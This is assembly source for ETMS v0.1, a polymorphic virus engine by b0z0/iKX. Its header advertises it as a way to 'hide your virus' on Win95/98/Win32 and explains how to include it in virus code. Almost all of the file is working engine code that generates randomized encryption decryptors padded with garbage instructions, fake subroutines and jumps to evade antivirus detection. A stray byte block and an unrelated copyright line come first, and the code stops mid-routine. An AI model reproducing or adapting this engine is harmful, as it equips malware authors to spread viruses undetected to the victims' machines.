                db      0C3h,089h,07Dh,0F0h,0C3h,08Bh,045h,01Ch,0EBh,003h
                db      08Bh,045h,0F4h,0ABh,029h,0C0h,0C3h,08Ah,045h,0ECh
                db      0AAh,0C3h,089h,0ECh,05Dh,08Fh,085h,080h,001h,000h
                db      000h,08Fh,085h,07Ch,001h,000h,000h,08Fh,045h,062h
                db      089h,07Ch,024h,01Ch,061h,029h,0F8h,0C3h,08Bh,045h
                db      01Ch,0C1h,0C0h,007h,066h,0F7h,0D8h,005h,0A5h,023h
                db      08Fh,0B7h,031h,045h,01Ch,0C3h

		; Copyright BlueOwl, november 2004


;
;
;                      - expressway to my skull -
;                             [ETMS]  v0.1
;                              -b0z0/iKX-
;
; Intro:
;  This is a polymorphic engine for Win95/98/32 based viruses. It (not sure
; about this anyway) creates quite polymorphic decryptors that could be used
; to hide your virus or something else. Skip some lines to get a tech
; description and try to generate a few samples to see what it can do.
;  Somebody could ask which is the sense of such a name for a poly. The answer
; is simple: should there be a reason for everything? I find a lot of things
; totally nonsense, so why should poly engines have a name that could fit for
; a poly engine? I just felt like using this name for my poly and I did so. It
; is somewhat a change from the title of a Sonic Youth song named 'Expressway
; to yr skull' (named also 'The Crucifixion of Sean Penn' or 'Madonna, Sean and
; me'), a song that I like and that I found very near when I was writing this
; poly engine.
;
; Features:
;   Basic features:
;       - Encryption using XOR/ADD/SUB/ROL/ROR on bytes/words/dwords with
;         either fixed (fixed immediate or fixed reg) or changing key
;       - Can use all registers as pointers, counters and key holders
;       - Can encrypt from start to end and from end to beginning
;       - Can create memory reference with offset (ie. [ECX + 1234h])
;       - Counter with random costants added, counts both decrementing or
;         incrementing its value
;       - Key change using XOR/ADD/SUB/ROL/ROR/INC/DEC on bytes/words/dwords
;         of the key register
;       - Quite some different ways of counting loop
;       - Some garbage is encrypted aswell
;       - Lenght of generated decryptors range somewhere between 400
;         bytes up to 4kbs
;
;   Garbage:
;       - All the normal math, logical and comparation operations and
;         assignations on registers, immediates and memory references
;       - Moving and exchanging of registers
;       - Push of regs/imms/mem_data, pop to regs
;       - Creation of fake subroutines
;       - Conditional and unconditional jumps
;       - Usual one byte opcodes
;       - Temporary saves somewhere (to another register or to stack) important
;         registers (such as key, counter and pointer) and makes garbage with
;         them.
;       - More or less all the usual code you could find around in normal
;         programs, excepts memory writes and such. Anyway you'd better give a
;         look to some decryptors, it is not easy to write too deeply what it
;         does.
;
;
; Using the poly:
;   Just add the ETMS source in your virus, simply:
;     include         etms.asm
;   Set the registers as described below and then call the poly. The poly uses
;  some data for internal purposes. This data of course is not needed to be
;  carried around with your infected file or whatever. You can just include
;  the ETMS source at the end of the file and then skip the bytes that start
;  from the label _mem_data_start. Of course you'll need to have that free
;  memory placed there at runtime.
;   The random seed (the dd at seed) should be initialized at first poly
;  run to a value between 0 and 714024.
;
;    Calling parameters:
;       ECX     =       Lenght of things to be encrypted
;       ESI     =       Pointer to what we want to encrypt
;       EDI     =       Where to place decryptor and encrypted stuff
;       EBP     =       Offset at which decryptor will run
;
;    On exit:
;       EDI     =       Pointer to generated code
;       ECX     =       Lenght of generated code (decryptor + encrypted code)
;
; Note:
;  I tried to write the poly quite clearly adding quite some comments.
; Nevertheless in some parts the code could be a bit messy or strange since
; I tried to optimize it at least a bit (like converting most of direct
; memory 32bit references to a reference [reg + off8] that are much shorter).
; I apologize for some quite messy code and if you have some problems
; understanding something, please contact me.
;
; Contacts:
;  For any question, comment or whatever about the poly or about whatever feel
; free to mail me at cl0wn@geocities.com.
;
;

etms_engine:
        cld
        push    edi
        push    edi

        call    poly_delta
poly_delta:
        pop     eax                     ; where we are running
        sub     eax,offset poly_delta
        push    eax

        lea     ebx,[offset t_inipnt + eax]

o_tini  equ     offset t_inipnt         ; save some bytes since off between
                                        ; various data is a 8b

        mov     dword ptr [ebx],edi
        mov     dword ptr [ebx - (o_tini - offset v_lenght)],ecx
        mov     dword ptr [ebx - (o_tini - offset v_virusp)],esi
        mov     dword ptr [ebx - (o_tini - offset v_runnin)],ebp

        mov     dword ptr [ebx - (o_tini - offset r_pointer)],010ffffffh
        mov     dword ptr [ebx - (o_tini - offset t_chgpnt)],01000404h

        xor     eax,eax
        mov     dword ptr [ebx - (o_tini - offset t_fromend)],eax
        mov     dword ptr [ebx - (o_tini - offset t_pntoff)],eax
        mov     dword ptr [ebx - (o_tini - offset t_cntoff)],eax
        mov     dword ptr [ebx - (o_tini - offset t_inacall) - 2],eax

        xor     cl,cl
bit_loop:
        shl     ebp,1
        jc      founded_first1                  ; find higher bit with an 1
        inc     cl                              ; for random memory offsets
        jmp     bit_loop
founded_first1:
        mov     byte ptr [ebx - (o_tini - offset t_memand)],cl

        pop     ebp                             ; delta

        push    edi
        mov     al,90h
        lea     edi,[offset enc_space + ebp]
        mov     dword ptr [ebx - (o_tini - offset w_encrypt)],edi
        mov     ecx,enc_max
        rep     stosb
        pop     edi

        call    rnd_garbage

        mov     ecx,3
        lea     esi,[offset r_pointer + ebp]

init_part:
        push    ecx
select_register:
        call    get_register                    ; get a unused register
        xchg    eax,ecx

        call    set_used                        ; mark as unusable in future
        xchg    eax,ebx

select_block:
        call    get_random_al7
        and     al,011b
        jz      select_block                    ; select from 01 to 03

        dec     eax
        cmp     byte ptr [eax+esi],0ffh         ; check if that stage already
        jne     select_block                    ; done

        mov     byte ptr [eax+esi],bl           ; save the register for that
                                                ; stage
        or      al,al
        jnz     not_pointer

        mov     dword ptr [esi - (offset r_pointer - offset w_pointer)],edi
                                                ; save offset where the
                                                ; pointer is initialized
        jmp     assign_next

not_pointer:
        dec     eax
        jnz     not_counter

        mov     dword ptr [esi - (offset r_pointer - offset w_counter)],edi
        jmp     assign_next                     ; assign inital counter

not_counter:

        call    get_random                      ; get key
        mov     dword ptr [esi - (offset r_pointer - offset v_initkey)],eax
        xchg    eax,ecx

        call    get_random
        and     al,1
        jz      assign_next                     ; if so use key
        call    unset_used
        mov     byte ptr [esi+2],20h            ; don't use key
        jmp     next_loop
assign_next:
                ; BL  register
                ; EAX value
        xchg    eax,ebx                 ; in bl register
        or      al,0b8h                 ; mov base
        stosb
        xchg    eax,ecx
        stosd                           ; the value

next_loop:
        call    rnd_garbage
        pop     ecx
        loop    init_part               ; make all init steps


; now some base assignment to a pointer, counter and key (if used) registers
; has been done. here we are gonna change a bit the various registers where
; the various things has been assigned
        call    get_random_al7
        and     al,011b                 ; from 0 to 3 moves
        jz      decryptor_build_start
        xchg    eax,ecx
reg_movida:
        push    ecx
get_whichone:
        call    select_save             ; select which to change (pnt,cnt,key)
        jc      leave_this_out

        call    save_mov_xchg           ; change the regs using mov or xchg
        mov     byte ptr [edx],al
leave_this_out:
        pop     ecx
        loop    reg_movida

decryptor_build_start:
; decryptor loop begins right here

        lea     esi,[offset t_chgpnt + ebp]
        mov     dword ptr [esi - (offset t_chgpnt - offset w_loopbg)],edi

        call    get_random              ; select if starting from head or from
        and     ax,0101h                ; tail and if counter will dec or inc
        mov     word ptr [esi - (offset t_chgpnt - offset t_fromend)],ax

        xchg    eax,edx                 ; rnd in edx

        shl     edx,1                   ; add a constant to counter?
        jnc     normal_counter
        call    get_random
        mov     dword ptr [esi - (offset t_chgpnt - offset t_cntoff)],eax
normal_counter:
        cmp     byte ptr [esi - (offset t_chgpnt - offset r_pointer)],05h
                                        ; no bp + off
        je      reget_size_op

        shl     edx,1                   ; select if use only pointer or
        jc      reget_size_op           ; pointer + offset
        call    get_random              ; select random offset
        mov     dword ptr [esi - (offset t_chgpnt - offset t_pntoff)],eax
                                        ; if using get offset
reget_size_op:
        call    get_random
        mov     edx,eax
        and     eax,0fh                 ; select math operation and size
        or      eax,eax                 ; of operand
        jz      reget_size_op

;      byte  word  dword
; ror   1     6     b
; sub   2     7     c
; xor   3     8     d
; add   4     9     e
; rol   5     a     f
;
no_rorrrpr:
        cmp     byte ptr [esi - (offset t_chgpnt - offset r_regkey)],03
                                        ; if not ax,cx,dx,bx then can't be byte
        jb      can_use_all             ; as key
        cmp     al,6                    ; is byte? get another
        jb      reget_size_op

can_use_all:
        xor     ecx,ecx
        mov     cl,9
        cmp     byte ptr [esi - (offset t_chgpnt - offset r_regkey)],20h
        je      no_keychanges

        shr     edx,8                   ; edx has rnd
        and     edx,011b
        mov     byte ptr [esi - (offset t_chgpnt - offset t_chgkey)],dl
        add     ecx,edx

no_keychanges:
        cmp     al,0bh
        jae     ok_counts
        sub     ecx,4d                  ; if with words 4 inc/dec less
        sub     word ptr [esi],0202h
        cmp     al,06d
        jae     ok_counts
        dec     ecx                     ; for bytes even less
        dec     ecx
        sub     word ptr [esi],0101h

ok_counts:
        push    eax
        call    rnd_garbage
get_nextseq:
        call    get_random
        and     eax,011b
        xchg    eax,edx
        cmp     byte ptr [esi+edx],0
        je      get_nextseq
        dec     byte ptr [esi+edx]
        shl     edx,2                   ; offset = * 4
        sub     edx,(offset t_chgpnt - offset o_table)
        pop     eax
        push    eax
        push    ecx
        push    esi
        mov     ecx,dword ptr [esi+edx]
        add     ecx,ebp
        call    ecx                     ; call the routine to do it
        pop     esi
        pop     ecx
        pop     eax
        loop    ok_counts

; finished decryption loop, needs comparation and jumps
        call    rnd_garbage

        xor     eax,eax
        inc     eax
        mov     ecx,dword ptr [esi - (offset t_chgpnt - offset t_cntoff)]
        or      ecx,ecx
        jnz     must_compare

get_checker:
        call    get_random
        and     eax,0fh
        cmp     al,09d
        ja      get_checker
must_compare:
        shr     al,1
        pushf
        mov     ah,byte ptr [eax + offset chk_counter + ebp]   ; get comparer
        add     ah,byte ptr [esi - (offset t_chgpnt - offset r_counter)]
        mov     al,81h
        popf
        jc      store_d00
        inc     eax
        inc     eax
        stosw
        xor     al,al
        stosb
        jmp     make_jumps
store_d00:
        stosw
        xchg    eax,ecx
        cmp     byte ptr [esi - (offset t_chgpnt - offset t_countback)],00h
        je      not_negcnt1
        neg     eax
not_negcnt1:
        stosd
make_jumps:
        call    get_random
        ror     al,1
        jc      do_withlong
        stosw

        call    make_jmpback            ; do jump back, in EAX lenght of jump

        cmp     eax,7fh                 ; max short jump offset
        jb      ok_offsetj
        mov     edi,ebx                 ; if > then redo from start
        dec     edi
        dec     edi
        jmp     make_jumps
ok_offsetj:
        mov     ah,74h                  ; jne + offset
        xchg    al,ah
        mov     word ptr [ebx-2],ax
        jmp     done_cond
do_withlong:
        mov     ax,840fh                ; jz long
        stosw
        stosd
        call    make_jmpback            ; do jump back, in EAX lenght of jump

        mov     dword ptr [ebx-4],eax     ; store the lenght
done_cond:


; now decryption loop generation is finished
        lea     esi,[offset v_lenght + ebp]
        mov     byte ptr [esi - (offset v_lenght - offset r_used)],10h
                                        ; can use all regs (except ESP) again

        call    rnd_garbage             ; unencrypted one, some more here
        call    rnd_garbage

        push    edi
        call    rnd_garbage                     ; encrypted garbage
        pop     ecx
        neg     ecx
        add     ecx,edi                 ; how much encrypted garbage

        mov     edx,ecx
        sub     edi,edx

        add     ecx,dword ptr [esi]

        shr     ecx,2                   ; so it will be enough for b/w/d enc
        inc     ecx
        shl     ecx,2

        pop     eax
        neg     eax
        add     eax,edi                         ; lenght of decryptor
        add     eax,dword ptr [esi - (offset v_lenght - offset v_runnin)]
                                                ; running offset
        mov     ebx,dword ptr [esi - (offset v_lenght - offset w_pointer)]
        cmp     byte ptr [esi - (offset v_lenght - offset t_fromend)],00h
        pushf
        je      no_adding
        add     eax,ecx                         ; from end
no_adding:
        sub     eax,dword ptr [esi - (offset v_lenght - offset t_pntoff)]
                                                ; - pointer offset if is there
        mov     dword ptr [ebx+1],eax           ; set initial pointer

        mov     ebx,dword ptr [esi - (offset v_lenght - offset w_counter)]
        inc     ebx
        mov     eax,dword ptr [esi - (offset v_lenght - offset t_cntoff)]
        add     eax,ecx
        mov     dword ptr [ebx],eax

        cmp     byte ptr [esi - (offset v_lenght - offset t_countback)],00h
        je      not_negcnt
        neg     dword ptr [ebx]

not_negcnt:

        mov     esi,dword ptr [esi - (offset v_lenght - offset v_virusp)]

        mov     ebx,edi                 ; pointer on code to encrypt
        add     edi,edx                 ; + encrypted garbage
        popf
        je      no_adding2
        add     ebx,ecx                 ; add lenght if from end

no_adding2:

        push    ecx
        sub     ecx,edx
        rep     movsb                   ; copy what to encrypt
        pop     edx

        db      0b9h                    ; mov ecx
v_initkey       dd      00h             ; initial key value

enc_max equ     20h
; lenghts
; 6     = max encryption operation
; 4     = max 4 inc/dec counter
; 4     = max 4 inc/dec counter
; 3 * 6 = max 3 * 6 byte key change operations

enc_space:
        db      enc_max dup (90h)       ; here the encryptor will be placed
        or      edx,edx
        jnz     enc_space               ; loop

        mov     ecx,edi
        pop     edi
        sub     ecx,edi                 ; total lenght
        ret                             ; poly finished
; - ETMS return point

poly_name       db      '[ETMS] v0.1 -b0z0/iKX-',0

make_jmpback:
        push    edi

        call    rnd_garbage

        mov     al,0e9h
        stosb
        mov     eax,dword ptr [esi - (offset t_chgpnt - offset w_loopbg)]
                                                ; the jump back to start of
        sub     eax,04h                         ; the decryptor
        sub     eax,edi
        stosd

        call    rnd_garbage

        pop     eax
        mov     ebx,eax
        neg     eax
        add     eax,edi                 ; calculate lenght of jump and return
        ret                             ; with it

put_encloop_2:
        push    ecx
        xor     ecx,ecx
        inc     ecx
        inc     ecx
        jmp     short put_encloop
put_encloop_1:
        push    ecx
        xor     ecx,ecx
        inc     ecx
put_encloop:
; ecx nr of bytes
        push    eax
        xchg    edi,dword ptr [w_encrypt+ebp]   ; in EDI where we are in enc
                                                ; and save dec position
copy_it:
        stosb
        shr     eax,8
        loop    copy_it
        xchg    dword ptr [w_encrypt+ebp],edi   ; save next and restore dec pnt
        pop     eax
        pop     ecx
        ret

o_table:
o_counter       dd      offset ch_counter
o_pointer       dd      offset ch_pointer
o_key           dd      offset ch_key
o_mate          dd      offset ch_mate

ch_counter:                             ; decrement/increment counter
        mov     al,48h                  ; dec
        push    eax
        or      al,02h                  ; counter in enc uses EDX
        call    put_encloop_1
        pop     eax
        cmp     byte ptr [esi - (offset t_chgpnt - offset t_countback)],00h
        je      decrementing
        sub     al,08h                  ; else incrementing counter
decrementing:
        or      al,byte ptr [esi - (offset t_chgpnt - offset r_counter)]
        stosb
        ret

ch_pointer:                             ; increment/decrement pointer
        mov     al,40h                  ; inc
        cmp     byte ptr [esi - (offset t_chgpnt - offset t_fromend)],00h
        je      straight_up
        add     al,08h
straight_up:
        push    eax
        or      al,03h                  ; ebx
        call    put_encloop_1
        pop     eax
        or      al,byte ptr [esi - (offset t_chgpnt - offset r_pointer)]
        stosb
        ret

ch_key:                                 ; change key register
        cmp     byte ptr [esi - (offset t_chgpnt - offset r_regkey)],20h
        je      exit_keychange
get_modifier:
        call    get_random_al7
        cmp     al,6
        ja      get_modifier
        mov     cl,al
        mov     ah,byte ptr [eax + offset key_changers + ebp]
        mov     al,81h          ; add/sub/xor base
        cmp     cl,3
        jb      no_rrrr
        mov     al,0c1h         ; rol/ror base
no_rrrr:
        push    eax
reget_ksize:
        call    get_random      ; select if byte/word/dword
        and     al,011b
        jz      reget_ksize
        cmp     cl,04h          ; inc dec just on dw and dd
        jb      isntincdec
        cmp     al,01h
        je      reget_ksize
isntincdec:
        cmp     byte ptr [esi - (offset t_chgpnt - offset r_regkey)],3
        jbe     canall
        cmp     al,01b          ; byte keychange only for ax,cx,dx,bx
        je      reget_ksize
canall:
        mov     ch,al
        pop     eax
        cmp     ch,01h
        jne     no_decbyte
        dec     al
no_decbyte:
        cmp     ch,02h
        jne     no_wordprefix
        push    eax
        mov     al,66h
        stosb
        call    put_encloop_1
        pop     eax
no_wordprefix:
        cmp     cl,05h
        pushf
        jb      no_incdecch             ; inc/dec has just one byte opcode
        dec     edi
        mov     al,byte ptr [edi]
no_incdecch:
        popf
        push    eax
        jb      no_nopneeded
        mov     al,ah
        or      al,1            ; ecx key in enc loop
        call    put_encloop_1   ; for inc/dec
        jmp     short after_store
no_nopneeded:
        or      ah,1            ; key is ECX in enc loop
        call    put_encloop_2
after_store:
        pop     eax
        or      ah,byte ptr [esi - (offset t_chgpnt - offset r_regkey)]
        stosw
        cmp     cl,05           ; inc/dec doesn't need any key
        jae     exit_keychange
        call    get_random
        cmp     cl,03
        jae     just_one_bk     ; ror/rol just one byte key
        cmp     ch,01h
        je      just_one_bk     ; check dimension of key modifier
        stosb
        call    put_encloop_1
        shr     eax,8h
        cmp     ch,02h
        je      just_one_bk
        stosw
        call    put_encloop_2
        shr     eax,10h
just_one_bk:
        stosb
        call    put_encloop_1
exit_keychange:
        ret

ch_mate:                        ; creates the decryption math operation
        xor     edx,edx
        mov     ecx,5h
type_sel:
        cmp     eax,ecx
        jbe     ok_regs
        inc     edx
        sub     eax,ecx
        jmp     type_sel        ; get type and size.. in EDX size, in EAX type
                                ; edx = 0 for byte, 1 for word, 2 for dword
ok_regs:
        cmp     byte ptr [esi - (offset t_chgpnt - offset r_regkey)],20h
        lea     esi,[offset _math_imm + ebp]
        je      without_key
        add     esi,(offset _math_key - offset _math_imm)
without_key:
        dec     eax             ; type - 1
        push    esi
        push    eax
        shl     eax,1           ; each type is a word
        add     esi,eax
        lodsw                   ; ax = mathop word

        cmp     dl,1
        jne     not_word
        push    eax
        mov     al,066h
        stosb
        call    put_encloop_1
        pop     eax
not_word:
        or      dl,dl
        jnz     not_byte
        dec     al
not_byte:
        pop     ebx             ; type - 1
        pop     esi             ;

        push    ebx

        push    eax
        neg     ebx
        add     ebx,4           ; get opposite math operation
        shl     ebx,1
        add     esi,ebx
        lodsw

        lea     esi,[offset r_regkey + ebp]
        cmp     byte ptr [esi],20h
        je      ok_regskey
        cmp     al,0d3h
        je      ok_regskey
        add     ah,08h          ; since ECX is used as key
ok_regskey:
        or      dl,dl
        jnz     not_byterev
        dec     al
not_byterev:
        add     ah,03h          ; in enc loop using EBX
        call    put_encloop_2
        pop     eax

        mov     cl,byte ptr [esi - (offset r_regkey - offset r_pointer)]
        cmp     cl,03h          ; eax-ebx
        ja      upper_ones
        add     ah,cl
        jmp     ok_register_p
upper_ones:
        add     ah,06h
        cmp     cl,06h          ; esi
        je      ok_register_p
        inc     ah
        cmp     cl,07h          ; edi
        je      ok_register_p
        add     ah,03eh         ; ebp
ok_register_p:

        pop     ecx             ; type-1

        cmp     dword ptr [esi - (offset r_regkey - offset t_pntoff)],0
        je      not_plusoff
        add     ah,80h
not_plusoff:
        stosw

        xor     eax,eax

        cmp     byte ptr [esi],20h    ; using key?
        je      ok_register_k

        or      cl,cl
        je      check_rr
        cmp     cl,4
        jne     not_rol_ror
check_rr:
        cmp     byte ptr [esi],1   ; is key CX (cl)
        je      ok_register_k
        mov     al,10h                  ; if not put just immediate
        sub     byte ptr [edi-2],12h

        mov     ebx,dword ptr [esi - (offset r_regkey - offset w_encrypt)]
        sub     byte ptr [ebx-2],12h

        push    ecx
        mov     bl,20h
        xchg    bl,byte ptr [esi]       ; won't use key reg anymore in the
        call    unset_used              ; future, so use for garbage
        pop     ecx
        jmp     short ok_register_k

not_rol_ror:
        mov     al,byte ptr [esi]
        shl     eax,3                   ; * 8
        add     byte ptr [edi-1],al     ; key register

ok_register_k:
        cmp     byte ptr [esi - (offset r_regkey - offset r_pointer)],05h
        jne     not_usingbp
        mov     byte ptr [edi],00h
        inc     edi
not_usingbp:

        mov     eax,dword ptr [esi - (offset r_regkey - offset t_pntoff)]
        or      eax,eax
        jz      no_offsetadd
        stosd
no_offsetadd:
        cmp     byte ptr [esi],20h
        jne     no_key_needed

        mov     eax,dword ptr [esi - (offset r_regkey - offset v_initkey)]
        or      cl,cl
        je      byte_key
        cmp     cl,4
        je      byte_key
        or      dl,dl
        je      byte_key

        stosb
        call    put_encloop_1

        shr     eax,8
        dec     dl
        jz      byte_key
        stosw
        call    put_encloop_2
        shr     eax,10h
byte_key:
        stosb
        call    put_encloop_1

no_key_needed:
        ret

rnd_garbage:
        push    ecx
        push    eax
        call    get_random
        and     eax,0fh         ; max - 1
        inc     eax             ; not zero
        xchg    eax,ecx

garbager:
; ecx how many
        push    edx
        push    ebx
garbager_loop:
        push    ecx
get_op_type:
        call    get_random      ; how many possible types
        and     eax,0fh

        mov     ecx,[(eax*4)+offset garbage_offsets+ebp]
        add     ecx,ebp
        call    ecx                     ; call garbage routine
        pop     ecx
        loop    garbager_loop

        mov     eax,dword ptr [t_pushed+ebp]

        cmp     eax,000005h     ; if not in a call, not in a jump and
        ja      stack_is_ok     ; pushed <=5

        or      eax,eax
        jz      stack_is_ok

        inc     byte ptr [t_inacall+ebp]

        cmp     al,01h
        ja      direct_addesp
        call    do_pop_nocheck
        jmp     stack_is_ok

direct_addesp:
        push    eax             ; then correct stack
        mov     ax,0c483h       ; add esp,nr_dd * 4
        stosw
        pop     eax
        call    force_popall
stack_is_ok:
        pop     ebx
        pop     edx

        pop     eax
        pop     ecx
        ret


do_push:
        cmp     byte ptr [t_pushed+ebp],05h     ; max dwords on the stack
        ja      exit_pusher
        inc     byte ptr [t_pushed+ebp]
        call    get_random              ; 4 types of pushing
        and     al,011b
        jz      push_register           ; normal push reg
        dec     al
        jz      push_immediate_dd       ; push immediate double
        dec     al
        jz      push_immediate_by       ; push immediate byte

        mov     ax,35ffh                ; push immediate from memory
        stosw
        call    get_address
        jmp     pre_exit_dd

push_immediate_by:
        mov     al,6ah
        stosb
        call    get_random
        shr     al,1
        jc      zero_or_menouno
        call    get_random              ; normal push as byte
        jmp     pre_exit_pusher

zero_or_menouno:                        ; very usual pushes
        and     al,01b                  ; so we will get 0 or -1
        dec     al                      ; to LARGE 0 or to LARGE -1
        jmp     pre_exit_pusher

push_immediate_dd:
        mov     al,68h
        stosb
        call    get_random
pre_exit_dd:
        stosd                           ; normal push as double
        jmp     exit_pusher

push_register:
        call    get_random_al7
        add     al,050h
pre_exit_pusher:
        stosb
exit_pusher:
        jmp     exit_ppc

do_pop:
        cmp     byte ptr [t_pushed+ebp],00h
        je      return_nopop
do_pop_nocheck:
        call    get_random
        shr     al,1
        jnc     popintoreg2
        mov     ax,0c483h       ; add esp,
        stosw
get_number:
        call    get_random_al7
        jz      get_number
        cmp     al,byte ptr [t_pushed+ebp]
        ja      get_number
force_popall:
        sub     byte ptr [t_pushed+ebp],al
        shl     al,2            ; dd are pushed, so * 4
        jmp     store_ngo2
popintoreg2:
        call    get_register
        add     cl,058h         ; pop in a register
        xchg    eax,ecx
        dec     byte ptr [t_pushed+ebp]
store_ngo2:
        stosb
return_nopop:
        jmp     exit_ppc

call_subroutines:
        cmp     word ptr [t_maxjmps+ebp],0h      ; don't nest too much nor
        jne     just_exit_call                   ; put pushes/pops in subs and
                                                 ; we can't know wassup in
                                                 ; conditional jumps and such

        inc     byte ptr [t_inacall+ebp]

        call    get_random_al7
        cmp     al,01h          ; 00h and 01h push
        jbe     do_push
        cmp     al,05           ; 02h - 05h pops (more probable so final stack
        jbe     do_pop          ; correction should be needed less often)

        ; 06,07 do a call
        mov     al,0e8h
        stosb
        stosd           ; place for offset

        push    edi
        call    rnd_garbage
        pop     ebx

        mov     al,0e9h
        stosb
        stosd                   ; jump offset
        push    edi
        call    rnd_garbage

        push    ebx
        neg     ebx
        add     ebx,edi
        xchg    eax,ebx
        pop     ebx

        mov     dword ptr [ebx-4],eax   ; call offset

        call    rnd_garbage    ; this is the called "subroutine"

        call    get_random      ; more ways of getting back from subroutine,
        shr     al,1            ; either with normal ret or by correcting the
        jnc     normal_ret      ; stack by popping or by adding to esp
        shr     al,1
        jnc     popintoreg
        mov     ax,0c483h       ; add esp,
        stosw
        mov     al,4
        jmp     store_ngo
popintoreg:
        call    get_register
        add     cl,058h         ; pop base
        xchg    eax,ecx
        jmp     store_ngo
normal_ret:
        mov     al,0c3h         ; ret
        stosb
        call    get_random_al7
        cmp     al,3
        ja      no_ccs
        xchg    eax,ecx
        mov     al,0cch         ; int3, usual after subroutines in win32s
        rep     stosb
store_ngo:
        stosb
no_ccs:
        call    rnd_garbage

        pop     ebx             ; jump offset

        push    ebx
        neg     ebx
        add     ebx,edi
        xchg    eax,ebx
        pop     ebx

        mov     dword ptr [ebx-4],eax
exit_ppc:
        dec     byte ptr [t_inacall+ebp]
just_exit_call:
        ret

maths_immediate_short:
        stc
        jmp     maths_immediate_1

maths_immediate:
        clc
maths_immediate_1:
        pushf
        call    get_random_al7 ; 0 to 7
        shl     al,3           ; * 8
        add     al,0c0h        ; the base
        popf
        push    eax
        pushf
        call    get_register
        add     al,cl
        mov     ah,81h          ; prefix
        popf
        pushf
        jnc     not_a_shortone
        inc     ah
        inc     ah
not_a_shortone:
        xchg    ah,al
        stosw
        call    g_dimension
        popf
        jnc     not_a_shortone2
        mov     cl,01h
not_a_shortone2:
        call    put_immediates
        pop     eax
        cmp     al,0f8h         ; is a CMP
        jne     not_compare
make_jmp_after_cmp:
        call    get_random
        and     eax,01b         ; long or short jump
        add     al,06h          ; short jump
        jmp     make_jump
not_compare:
        ret

cdq_jmps_savestack:
        call    get_random_al7
        sub     al,3
        jc      exit_c_j_ss
        xchg    eax,ecx
        mov     al,byte ptr [ecx+offset change_jump+ebp]
        cmp     cl,1
        ja      not_cdq_cbw

        test    byte ptr [r_used+ebp],0101b ; EAX and EDX for cbw,cwd,cdq,cwde
        jnz     exit_c_j_ss
        stosb
        inc     edi
        call    g_dimension
        dec     edi
        jmp     exit_c_j_ss
not_cdq_cbw:
        cmp     cl,4
        je      pushandmov
        add     cl,4                    ; this is used for dimension
        jmp     do_that_fjump           ; do as for conditional ones
pushandmov:

        call    select_save
        jc      exit_c_j_ss

        xchg    eax,ebx
        mov     al,50h                  ; push

        xor     ch,ch                   ; so it won't be erased from stack
        xchg    ch,byte ptr [t_pushed+ebp]

        push    ecx
        call    unset_used              ; mark that as unused one
        add     al,bl                   ; push the reg
        stosb
        call    rnd_garbage
        add     al,08h          ; pop opcode
        stosb

        pop     ebx
        mov     byte ptr [t_pushed+ebp],bh
        mov     byte ptr [r_used+ebp],bl
exit_c_j_ss:
        ret


gen_one_byters:
        call    get_random_al7
make_jump:
        mov     cl,al
        mov     al,byte ptr [eax+offset one_byters+ebp]   ; get onebyter
        cmp     cl,05h
        jbe     not_jump
do_that_fjump:
        cmp     byte ptr [t_maxjmps+ebp],3        ; don't nest too much
        je      just_exit
        inc     byte ptr [t_maxjmps+ebp]

        cmp     al,0e9h                 ; for unconditional ones skip some
        jae     skip_unc                ; things

        cmp     cl,07h
        jne     not_longjump
        push    eax
        mov     al,0fh                  ; long prefix
        stosb
        pop     eax
not_longjump:
        push    eax
        call    get_random
        and     al,0fh
        mov     ch,al
        pop     eax
        add     al,ch
skip_unc:
        stosb                           ; type of jump
        stosb                   ; first off
        cmp     cl,07h
        jne     not_longone
        dec     edi
        stosd
not_longone:
        push    edi
        call    rnd_garbage
        pop     ebx
        mov     eax,edi
        sub     eax,ebx                 ; offset of jump
        dec     byte ptr [t_maxjmps+ebp]
        cmp     cl,7
        je      long_jumper
        cmp     eax,7fh                 ; if not too big then use it
        jb      good_jump
        mov     edi,ebx                 ; else forget everything
        dec     edi
        dec     edi
        ret
good_jump:
        mov     byte ptr [ebx-1],al
        ret
long_jumper:
        mov     dword ptr [ebx-4],eax
        ret
not_jump:
        stosb
just_exit:
        ret

mem_assign:
        mov     ax,058bh
        jmp     mem_common

mem_mathops:
        call    get_random_al7  ; 0 to 7
        shl     al,3
        add     al,03h          ; base
mem_common:
        push    eax
        call    get_register
        shl     cl,3            ; *8
        add     cl,05h          ; base for eax
        mov     ah,cl
        stosw
        call    g_dimension

; now offset
        call    get_address
        stosd
        pop     eax
        cmp     al,3bh                  ; is a cmp
        je      make_jmp_after_cmp      ; if so force a compare
        ret


mov_registers:
        call    get_random_al7          ; random source
        add     al,0c0h
        mov     ah,08bh
        call    get_register            ; useful dest
        shl     cl,3
        add     al,cl
        xchg    ah,al
        stosw
        jmp     g_dimension

maths_registers:
        call    get_random_al7
        shl     al,3
        add     al,03h         ; base
        mov     ah,0c0h         ; suff
        push    eax

        call    get_register    ; dest
        shl     cl,03h
        add     ah,cl

        xchg    eax,ecx             ; save temp in ecx
        call    get_random_al7      ; all regs
        xchg    eax,ecx             ; reg in ECX and restore EAX

        add     ah,cl
        stosw

        call    g_dimension
        pop     eax
        cmp     al,3bh
        je      make_jmp_after_cmp
        ret

rotating_imms:
        call    get_random_al7
        cmp     al,0110b                ; 0f0 doesn't exist
        je      rotating_imms
        shl     al,3                    ; *8
        add     al,0c0h

        call    get_register
        add     al,cl
        mov     ah,0c1h
        xchg    al,ah
        stosw
        call    g_dimension
        xor     ecx,ecx
        inc     cl
        jmp     put_immediates

notneg_register:
        call    get_random
        shr     al,1
        mov     ax,0d0f7h
        jc      not_add
        add     ah,08h
not_add:
        call    get_register
        add     ah,cl
        stosw
;        jmp     g_dimension

g_dimension:
; EDI after generated garb
reget_dim:
        call    get_random
        and     eax,010b        ; 0 or 2
        jnz     no_change
word_change:
        mov     ecx,dword ptr [edi-2]
        mov     byte ptr [edi-2],66h    ; the prefix
        mov     dword ptr [edi-1],ecx
        inc     edi
no_change:
        inc     eax
        inc     eax
        xchg    eax,ecx                 ; in ECX needed immediates
        ret

imm_assign:
        call    get_register
        mov     al,0b8h         ; base
        add     al,cl
        stosb
        inc     edi
        call    g_dimension
        dec     edi
;        jmp     put_immediates

put_immediates:
; cl how many
        call    get_random
put_imm_part:
        stosb
        shr     eax,8
        loop    put_imm_part
        ret

inc_dec_reg:
        call    get_random
        and     al,01b
        shl     al,3                    ; * 8, so will be 0 or 8
        add     al,40h                  ; incdec generation
        call    get_register
        add     al,cl
        stosb
        inc     edi
        call    g_dimension
        dec     edi
        ret

xchg_regs:
        mov     ax,0c087h               ; xchg eax,eax
        call    get_register
        add     ah,cl
        call    get_register
common_test_xchg:
        shl     cl,3
